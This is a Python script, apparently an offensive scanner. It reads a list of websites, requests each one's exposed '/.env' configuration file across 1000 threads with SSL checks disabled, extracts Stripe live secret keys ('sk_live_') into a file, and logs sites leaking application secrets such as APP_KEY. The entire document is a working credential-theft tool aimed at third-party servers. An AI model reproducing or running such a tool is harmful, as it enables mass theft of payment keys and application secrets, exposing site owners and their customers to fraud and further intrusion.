import os, random, time, threading, aiohttp, asyncio, warnings, win32api
print("""

╱╱╱╭╮╱╱╱╱╱╱╭━━━┳━━━┳━━━╮╭━╮
╱╱╱┃┃╱╱╱╱╱╱┃╭━╮┃╭━╮┃╭━━╯┃╭╯
╭━━┫┃╭━━┳━╮╰╯╭╯┃┃┃┃┃╰━━┳╯╰┳━╮
┃╭╮┃┃┃╭╮┃╭╮┳╮╰╮┃┃┃┃┣━━╮┣╮╭┫╭╮╮
┃╭╮┃╰┫╭╮┃┃┃┃╰━╯┃╰━╯┣━━╯┃┃┃┃┃┃┃
╰╯╰┻━┻╯╰┻╯╰┻━━━┻━━━┻━━━╯╰╯╰╯╰╯
---------------------------------""")
envamt=0
skliveamt=0
goodip=0
total=0
dead=0
threadsamount=1000
txtfile=input('Enter name of your txt file: ').replace('.txt','')
win32api.SetConsoleTitle('TOTAL: 0 | ENV: 0 | SK: 0')
sites=open(f'{txtfile}.txt',encoding='utf-8').read().split('\n')
random.shuffle(sites)
async def ipscan():
    global stats, envamt, skliveamt, goodip, total, dead
    stats=f'ALL: {total} | ENV: {envamt} | SK: {skliveamt}'
    try:
        site=sites[0]
    except:
        quit()
    sites.pop(0)
    ip='http://'+site+'/.env'
    ip=ip.replace('http://http://','http://').replace('http://https://','http://').replace('//.env','/.env')
    timeout=aiohttp.ClientTimeout(total=5)
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                async with session.get(ip,timeout=timeout) as q:
                    r=await q.text()
    except:
        total+=1
        dead+=1
        print(f'\033[31mBAD => {ip}')
        
    else:
        if 'zendesk_live' in r:
            print(f'\033[31mBAD => {ip}')
        elif 'sk_live_' in r:
            open('! sk-ip.txt','a').write(ip+'\n')
            print(f'\033[32mSK LIVE: {ip}')
            res=r.split('sk_live_')
            res.pop(0)
            for i in res:
                skliveamt+=1
                sk='sk_live_'+i.split('"')[0].split('\n')[0].split('#')[0].split('%')[0].split('&')[0].split(')')[0].split("'")[0].split('}')[0].split(']')[0].split(',')[0].split('.')[0].split('/')[0].split('|')[0].split('-')[0]
                open('! sks.txt','a').write(sk+'\n')
        elif 'APP_NAME' in r or 'APP_URL' in r or 'APP_HOST' in r or 'APP_KEY' in r or 'APP_DEBUG' in r or 'APP_ENV' in r:
            envamt+=1
            open('! env-ip.txt','a').write(ip+'\n')
            print(f'\033[33mENV LOG => {ip}')
        else:
            print(f'\033[31mBAD => {ip}')
        goodip+=1
        total+=1

def start():
    asyncio.run(ipscan())

while True:
    threadz = []
    for i in range(threadsamount):
        thread = threading.Thread(target=start)
        thread.daemon = True
        threadz.append(thread)
    for i in range(threadsamount):
        threadz[i].start()
    for i in range(threadsamount):
        threadz[i].join()
    win32api.SetConsoleTitle(stats)
